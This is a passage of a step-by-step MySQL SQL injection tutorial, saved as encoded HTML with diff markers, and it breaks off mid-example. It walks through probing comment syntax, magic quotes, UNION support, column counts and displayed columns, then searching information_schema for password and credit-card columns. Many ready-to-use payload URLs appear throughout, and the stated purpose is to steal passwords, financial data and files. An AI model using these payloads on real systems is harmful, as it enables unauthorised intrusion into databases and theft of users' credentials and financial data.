+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">SELECT title FROM =
+news where id =3D=20
+1</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">This gives the error =
+- "Error in=20
+MySQL Syntax by '1' or 1=3D1 --' in script.php on line 7." </P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Remember, MySQL =
+always surrounds=20
+the problem part in the query, in this case 1=E2=80=99 or 1=3D1 --, with =
+quotes, so don=E2=80=99t=20
+let the beginning and end quotes confuse you.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Even though the error =
+shows you=20
+that 1 has a ' after it (by '1' or 1=3D1 --') we will pretend we didnt =
+notice (not=20
+all sites have errors like this anyway).</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">So we would try =
+next</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: =
+0.14in">http://site.com/script.php?id=3D1=20
+or 1=3D1 /*</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">same error - "Error =
+in MySQL=20
+Syntax by '1' or 1=3D1 --' in script.php on line 7."</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Now lets try ending =
+it with '. so=20
+lets do:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: =
+0.14in">http://site.com/script.php?id=3D1'=20
+or 1=3D1 /*</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">now we get the error =
+- "Error in=20
+MySQL Syntax by '/*'. in script.php on line 7."</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">This would show us =
+that either /*=20
+isnt supported or this sql server is configured so that it needs a */ to =
+close=20
+the comment, which would defeat the purpose of commenting out the code. =
+But=20
+since it doesnt give us an error about the ' after id=3D1, we know were =
+close. So=20
+we try the next comment opertaor:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: =
+0.14in">http://site.com/script.php?id=3D1'=20
+or 1=3D1 --</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">The page loads =
+normally!!! Now we=20
+know we need to end the where clause with ' and add -- to the end to add =
+our sql=20
+commands!!</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Now we move on to the =
+next=20
+step:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><BR><BR></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><BR><BR></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><B>Subsection 2.3 - =
+Step 2)Check=20
+for magic quotes</B></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">We know from our =
+example before=20
+that magic quotes are off because we used ' to end the WHERE clause and =
+it gave=20
+no error, but lets pretend our first try worked, =
+http://site.com/script.php?id=3D1=20
+or 1=3D1 --, so were not sure if =E2=80=98 causes an error or not. We =
+need to know if=20
+magic quotes is on because if we want to use a function like load_file =
+to steal=20
+files (discussed later), or choose data where the user =3D 'admin', we =
+need to be=20
+able to use 's, so magic quotes MUST be off.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">To find out if theyre =
+on, we=20
+would try:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: =
+0.14in">http://site.com/script.php?id=3D1=20
+or '1'=3D'1' --</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">If you get an error =
+like:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">"Error in MySQL =
+Syntax by=20
+'\'1\'=3D\'1\''. in script.php on line 7."</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">or</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">"Error in MySQL =
+Syntax by=20
+'''1''=3D''1'''. in script.php on line 7."</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">then you would see =
+that magic=20
+quotes are on since its adding \s or an extra ' to the ' you put in. =
+Then you=20
+would not be able to steal files if load_file was enabled or choose =
+certain data=20
+using WHERE ( there is a way to get around it which I will discuss =
+later, but it=20
+doesnt work for load_file, just WHERE and other functions discussed =
+later like=20
+concat)</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">Now if you=20
+get no error, you know magic_quotes are off and you have an even bigger=20
+advantage. That was easy, wasn=E2=80=99t it? Now lets move on.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in"><BR><BR></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><B>Subsection 2.4 - =
+Step 3)Check=20
+to see if UNION works</B></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">UNION is a=20
+function in sql that lets us select more data in a single sql statement. =
+This=20
+can be very useful since we need to use it in order to select our own =
+data that=20
+we want to steal from the database such as passwords or financial data. =
+To=20
+illustrate its use further, heres an example. Say the query was:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">SELECT user from =
+users where pass=20
+=3D 'pass'</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">we could do</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">SELECT user from =
+users where pass=20
+=3D 'pass' UNION select email from emails limit 0,1</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">And no error would be =
+displayed.=20
+You don=E2=80=99t need to know how it helps get data to the page etc =
+since its not=20
+needed to get the injection working.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">However, in=20
+order to get the data from the UNION SELECT displayed, we would need to =
+make=20
+sure the first select statement displays no data at all.If the first =
+select=20
+statement does return data, it will overwrite the data from the UNION. =
+We will=20
+discuss this later. Also, it is always good to use UNION ALL instead of =
+just=20
+UNION, it can prevent type mismatch errors.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">Now, UNION is=20
+only availabe in mysql server versions above 3 (4,5,6 - 6 is the latest, =
+but 5=20
+is most popular). So in order to steal our data, we need to use union =
+(well, we=20
+could use blind injection, but thats a pain in the ass), and in order to =
+use=20
+union, the mysql version MUST be &gt; 3.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">There is a=20
+way to check for the mysql version without union ( 1 and =
+(substr(@@version,=20
+1)&gt;3 )- but its more advanced than the general tone of this tutorial =
+at the=20
+moment (ill go over it in a bit), so we will use an easier way. This is =
+to try a=20
+union select and judge the error. So we could try:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: =
+0.14in">http://site.com/script.php?id=3D1'=20
+UNION ALL SELECT 1 --</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">If you get an error =
+like :</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">"Error in MySQL =
+Syntax by=20
+'UNION'. in script.php on line 7."</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Then you know that =
+the server is=20
+not understanding what UNION is since its getting an error at the UNION =
+keyword.=20
+If you got an error like:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">"MySQL Error: Select =
+statements=20
+must have the same number of columns in script.php on line 7."</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">Then you know=20
+union worked since it realizes that both selects don=E2=80=99t have the =
+same number of=20
+columns, therefore showing that it reads two selects, where ones the =
+original=20
+and one our union. Even If we got a different error such as a type =
+conversion,=20
+as long as its not saying an error by UNION its ok. For some errors that =
+just=20
+show =E2=80=9CINTERNAL ERROR=E2=80=9D or something similar, it=E2=80=99s =
+a good idea to try the next=20
+method. </P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">So, if there=20
+arent error messages like this, and just errors like INTERNAL ERROR, =
+then you=20
+can use</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: =
+0.14in">http://site.com/script.php?id=3D1'=20
+and substr(@@version,1)&gt;3 --</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">Substr is a=20
+function that takes a certain character from a string. @@version gives =
+us the=20
+mysql version in a string. So say @@version returned 4.1.33-log, subtr =
+would get=20
+the 1st letter in it (the ,1 in substr(@@version,1)), which is 4. Then =
+it checks=20
+if 4 is greater than 3 (the &gt;3 part). If it is, the page loads =
+normally. If=20
+it doesnt, the page will load with no data (you can get a blank page, or =
+a page=20
+with the basic template but no actual data, e.g. no title for the news =
+and no=20
+actual news).</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">Now if UNION=20
+works, were in business! Time to move on! if not, you can use blind =
+injection,=20
+which will be briefly discussed later in Part 2.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><BR><BR></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><BR><BR></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><B>Subsection 2.5 - =
+Step 4)Find=20
+the number of columns</B></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">This section will fix =
+this error=20
+we got before- "MySQL Error: Select statements must have the same number =
+of=20
+columns in script.php on line 7.". In order to actually use UNION to =
+steal data,=20
+we must make union work first with no error at all so the page can load =
+and=20
+display the stolen data.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">This error=20
+occured because the initial SELECT statement and the UNION ALL SELECT =
+statement=20
+we injected had a different number of columns.Whenever you have UNION =
+SELECT (or=20
+UNION ALL SELECT), the number of columns must ALWAYS match the number of =
+columns=20
+in the first SELECT statement, or you=E2=80=99ll get an error. For =
+example, if the query=20
+looked like this:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Select user,pass FROM =
+users WHERE=20
+userid =3D 1 UNION ALL SELECT email FROM emails</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">You will get that =
+error since the=20
+first select is selecting two columns (user and pass) while the UNION =
+ALL SELECT=20
+is selecting only one (email). So if you did </P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Select user,pass FROM =
+users WHERE=20
+userid =3D 1 UNION ALL SELECT email,id FROM emails</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">There wouldnt be an =
+error and the=20
+query would execute succesfully since the first select statement is =
+selecting=20
+two columns (user and pass) and the second select, the union all select, =
+is also=20
+selecting two columns (email and id).</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Now to get the number =
+of columns=20
+in the first select statment, we can do two things:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">1) guess the number =
+of columns=20
+till you get it right. For example</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: =
+0.14in">http://site.com/script.php?id=3D1'=20
+UNION ALL SELECT null --</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">(null is a data type =
+that means=20
+empty. If you used 1 or 'the' - or in other words, an integer or string, =
+you=20
+might get a type mismatch error)</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">If you get an error =
+like "MySQL=20
+Error: Select statements must have the same number of columns in =
+script.php on=20
+line 7." then you move on to </P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: =
+0.14in">http://site.com/script.php?id=3D1'=20
+UNION ALL SELECT null,null --</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">and continue adding a =
+,null (an=20
+extra column) to the URL until you get no error. Then count the nulls =
+and thats=20
+the number of columns!</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">2) use order by - =
+this is WAY=20
+easier.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">ORDER BY is a =
+statement in SQL=20
+that tells the database server how to order the result. For example, if =
+you=20
+did</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">SELECT title,data =
+FROM news WHERE=20
+id=3D1 ORDER BY news ASC</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><BR><BR></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">the server would =
+order the all=20
+the output in alphabetical order from a-z. If you changed ASC to DESC it =
+would=20
+make it z-a.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">The server =
+automatically sees if=20
+the column is a string or integer. if its a string, it goes =
+alphabetically, and=20
+if its an integer, numerically.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">ORDER BY also=20
+selects numbers instead of columns. The number is the number of the =
+column in=20
+the select statement. For example, if the query waas this:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">SELECT title,data =
+FROM news WHERE=20
+id=3D1 ORDER BY 1 ASC</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">It would choose the =
+first column=20
+chosen in the query, which is title (it chooses from title, data). Then =
+it=20
+orders the result alphabetically from a-z.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">If it was </P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">SELECT title,data =
+FROM news WHERE=20
+id=3D1 ORDER BY 2 ASC</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">It would use the =
+second column=20
+selected, data, and order it by that.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">So we can take =
+advantage of this=20
+and try numbers from 1 on in the URL. Once we hit an error saying that =
+the=20
+column is invalid, we know that the last number to NOT give an error is =
+the=20
+number of columns. Heres an example:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: =
+0.14in">http://site.com/script.php?id=3D1'=20
+ORDER BY 1 -- no error</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: =
+0.14in">http://site.com/script.php?id=3D1'=20
+ORDER BY 2 -- no error</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: =
+0.14in">http://site.com/script.php?id=3D1'=20
+ORDER BY 3 -- no error</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: =
+0.14in">http://site.com/script.php?id=3D1'=20
+ORDER BY 4 -- error - "MySQL Error: No column number '4' in WHERE clause =
+in=20
+script.php on line 7."</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">So we know that 3, =
+the last=20
+number to not give an error, is the number of columns in the first =
+select!</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Now lets move on to =
+the next=20
+step!</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><BR><BR></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><B>Subsection 2.6 - =
+5)Craft a=20
+union statement that doesnt cause an error &amp; see which columns are=20
+outputted</B></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">So now that we know =
+the number of=20
+columns, we need to make a union statement and see which columns are =
+outputted=20
+to the site so we know which columns we can use to retrieve and output =
+our data=20
+to the screen. This is generally a two step process. </P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">1)First we craft the =
+union select=20
+statement( rememer to use union all) which numbers as the columns. An=20
+example:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><BR><BR></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: =
+0.14in">http://site.com/script.php?id=3D1'=20
+UNION ALL SELECT 1,2,3 --</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">If there is=20
+no error, you look at the screen and check which numbers are displayed =
+in the=20
+place data would normally be put (for example, in the place where the =
+article=20
+title would be, check if a number is there). </P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">If the=20
+numbers are on the screen, you know you can use the columns with those =
+numbers=20
+to display stolen data. The other columns that arent displayed are =
+useless.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">For example,=20
+if you see the number 2 in the title of the page and a number 3 where =
+the=20
+article is usually displayed, you know that you can use the second and =
+third=20
+column (where you put the 2 and 3 in the union all select 1,2,3 --) to =
+display=20
+data you will steal from the database to the page.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Now if you get an =
+error when you=20
+use all numbers like: "MySQL Error: Cant convert int in script.php on =
+line 7."=20
+then you know that one column cant be a number, so you should move to =
+step=20
+2.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">2)Since we know that =
+we cant go=20
+all out and put all integers, we need to use null. Null never causes a =
+type=20
+conversion error since its just an empty data holder. So we try:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: =
+0.14in">http://site.com/script.php?id=3D1'=20
+UNION ALL SELECT null,null,null --</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Now if you can an =
+error, there is=20
+a good chance the script has TWO select statements. For example, first =
+it can=20
+do</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">SELECT =
+title,data,author FROM=20
+news WHERE id=3D '[your data from the url]'</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">then in a later line =
+in the=20
+script it uses the id value from the url again in another select =
+statement like=20
+this:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">SELECT data,time FROM =
+news WHERE=20
+id=3D '[your data from the url]'</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Now, the first select =
+statment=20
+would be like this:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">SELECT =
+title,data,author FROM=20
+news WHERE id=3D '1' UNION ALL SELECT null,null,null --</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">but the second will =
+be </P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">SELECT date,time FROM =
+news WHERE=20
+id =3D '1' UNION ALL SELECT null,null,null --</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">This would cause an =
+error since=20
+the second query has ONLY TWO columns in the first select statement =
+(time,year),=20
+while the union all select has THREE columns. This will cause another =
+error=20
+saying select statement need the same number of columns. Now if you =
+change the=20
+UNION ALL SELECT to have two nulls, then the first select would cause an =
+
+error.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><BR><BR></P>
+<P class=3Dwestern=20
+style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: 0.5in">Unfortunately, there =
+is no way=20
+around this in mysql at the moment. (in mssql there is, however). A good =
+way to=20
+double check that its a multi select and not that you messed up the =
+number of=20
+columns in the UNION select statement is to cause an error like we did =
+before,=20
+doing</P>
+<P class=3Dwestern=20
+style=3D"MARGIN-BOTTOM: 0.14in">http://site.com/script.php?id=3D1'</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Say you got an error =
+like=20
+this:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">"MySQL Syntax Error =
+By '1'' In=20
+file script.php On Line 7."</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Then do the union all =
+select url=20
+like this:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: =
+0.14in">http://site.com/script.php?id=3D1'=20
+UNION ALL SELECT null,null,null --</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">say you get an error =
+like=20
+this:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">"MySQL Error: Select =
+statements=20
+must have the same number of columns in script.php on line 18."</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Now look at the two =
+errors. The=20
+first is on line 7, and the second on line 18. Now that you know that =
+two=20
+separate lines of code caused the error, you know that two separate =
+queries=20
+caused the error and it is infact a multi select, which you cant get =
+around.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Keep in mind that not =
+all sites=20
+have errors that verbose. Some just say "error". Then you would have to =
+double=20
+check the columns and make sure you didnt make a mistake.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in; TEXT-INDENT: =
+0.5in">So lets say=20
+there is no multi select. We left off at :</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: =
+0.14in">http://site.com/script.php?id=3D1'=20
+UNION ALL SELECT null,null,null --</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Now there is no =
+error. So we try=20
+this:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: =
+0.14in">http://site.com/script.php?id=3D1'=20
+UNION ALL SELECT 1,null,null --</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">We check for two =
+things: an=20
+error, and if no error is displayed, check if the number 1 is displayed =
+on the=20
+page in a place it wasnt before, like the title or where the news or =
+author=20
+would be.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Say you get the same =
+error as=20
+before in step 1:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">"MySQL Error: Cant =
+convert int in=20
+script.php on line 7."</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Then you know that =
+the first=20
+column causes an error, and you should ignore it and switch it back to =
+null.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">If it happens that =
+all the=20
+columns cause errors or arent displayed on the page, you can come back =
+and test=20
+it with 'test' instead of 1 and see if it displays text or still gives a =
+
+conversion error. If you get no error AND the word test is displayed on =
+the=20
+page, you can then go further and get usernames/passwords and any other =
+text=20
+based data, but not data that are integers like dates and credit =
+cards.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><BR><BR></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">So now that we know 1 =
+causes an=20
+error, we move on and check column two after we switch 1 back to =
+null.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: =
+0.14in">http://site.com/script.php?id=3D1'=20
+UNION ALL SELECT null,2,null --</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Now look at the =
+screen. Lets say=20
+there is an error. So now we know that 2 also causes an error and cant =
+be=20
+used.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">So lets change 2 back =
+to null and=20
+try 3.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: =
+0.14in">http://site.com/script.php?id=3D1'=20
+UNION ALL SELECT null,null,3 --</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">and guess what - no =
+error! now=20
+check the page for the number 3. Check any places such as the title bar =
+in your=20
+browser and places where data was like where the news was orthe author =
+or date.=20
+If you dont find anything, dont give up, make the number unique like =
+1232323132=20
+and view the source and see if its displayed in any hidden tags.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">If its not displayed, =
+as i said=20
+before, you can go back to the other two and try strings like 'test' (as =
+long as=20
+magic quotes are disabled, or your getting around them like i will =
+explain=20
+later), and check if those are displayed.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">So now we are left =
+with:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><FONT =
+color=3D#0000ff><U><A=20
+href=3D"http://site.com/script.php?id=3D1">http://site.com/script.php?id=3D=
+1</A></U></FONT>=E2=80=99=20
+UNION ALL SELECT null,null,3 =E2=80=93</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">and we know we can =
+use the=20
+3<SUP>rd</SUP> column to display our stolen data! So lets move on to =
+step 6:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><BR><BR></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><B>Subsection 2.7 - =
+Step 6)Check=20
+the mysql version to see if information_schema is present</B></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">This is an easy =
+step!</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Information_Schema is =
+a part of=20
+the database that holds ALL of the table names and column names stored =
+in that=20
+database. You can access it like any other table.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">To get tables, you =
+would use=20
+information_schema.tables like this:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">select table_name =
+from=20
+information_schema.tables </P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">This would return all =
+of the=20
+tables that exist in the database.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">To get columns you =
+would use=20
+information_schema.columns</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">select column_name =
+from=20
+information_schema.columns </P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">This would return all =
+the column=20
+names in all the tables of the database.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: =
+0.14in">Information_schema.columns also=20
+holds the table names, so you can switch column_name with table_name and =
+use it=20
+to get tables too.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Now this luxury is =
+only available=20
+in mysql version 5 and up (6). So to make sure we can use it, we need to =
+use the=20
+@@version command to check the version. So lets take our url and change =
+3 with=20
+@@version.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: =
+0.14in">http://site.com/script.php?id=3D1'=20
+UNION ALL SELECT null,null,@@version --</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Now, check where the =
+3 was before=20
+to see the version.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">If the version is =
+like=20
+4.0.22-log, then the mysql version is 4 and you cant use=20
+information_schema.tables, but if its 5.0.1, then you can use=20
+information_schema.tables! You can also use the substring method I =
+described=20
+before.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Now lets move on to =
+step 7:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><B>Subsection 2.8 =
+=E2=80=93 Step 7)=20
+Retrieve the desired columns</B></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">If the version is =
+aboveor equal=20
+to 5, we can scan information_schema for password (or credit card, etc) =
+columns.=20
+If not, we have to guess and use clues given to us in errors to find =
+prefixes,=20
+tables and columns that we want to steal data from. So for the first =
+part lets=20
+assume that information_schema is enabled.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Now we need to scan=20
+information_schema for columns that are similar to pass, password, =
+user_pass,=20
+etc. ( you can change it around so it will be creditcard, address, phone =
+number,=20
+etc)</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">So, we need to use=20
+information_schema.columns and the LIKE operator along with wildchars =
+(%) as i=20
+discussed in the basic info section.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">So if we were putting =
+queries=20
+straight into the db server, it would look like this:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">SELECT column_name =
+FROM=20
+information_schema.tables WHERE column_name LIKE '%pass%'</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">(of course, magic =
+quotes will=20
+have to be off. If they're on, you will learn how to get past them later =
+on)</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">For our vulnerable =
+site, it would=20
+look like this:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: =
+0.14in">http://site.com/script.php?id=3D1'=20
+UNION ALL SELECT 1,2,column_name FROM information_schema.tables WHERE=20
+column_name LIKE '%pass%' =E2=80=93</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">The LIKE =
+=E2=80=98%pass%=E2=80=99 is telling the=20
+server to scan make sure column_name has a value that is similar to =
+=E2=80=9Cpass=E2=80=9D and=20
+can have text before and after it (the wildchars). So it could be pass,=20
+userpass, password, etc.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">This will return the =
+first=20
+column_name that is like pass, with text before and after it (from the =
+wildchars=20
+before and after it).</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Now say you want the =
+table_name=20
+the columns in so you can access it with union. You would simply change=20
+column_name to table_name like this:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: =
+0.14in">http://site.com/script.php?id=3D1'=20
+UNION ALL SELECT 1,2,table_name FROM information_schema.tables WHERE =
+column_name=20
+LIKE '%pass%' --</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Now say you dont like =
+this first=20
+column/table, and you want to see if theres a second. There are two ways =
+we can=20
+do this. The first is with limit (which i explained in the basic info =
+section).=20
+So you would add limit 0,1 at the end which saying get 1 result starting =
+from=20
+the 0th (first for humans, 0 for computers) result.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Then after you get =
+the=20
+column/table, to move on you would do limit 1,1 then limit 2,1 etc until =
+it runs=20
+out of columns. Heres an example:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: =
+0.14in">http://site.com/script.php?id=3D1'=20
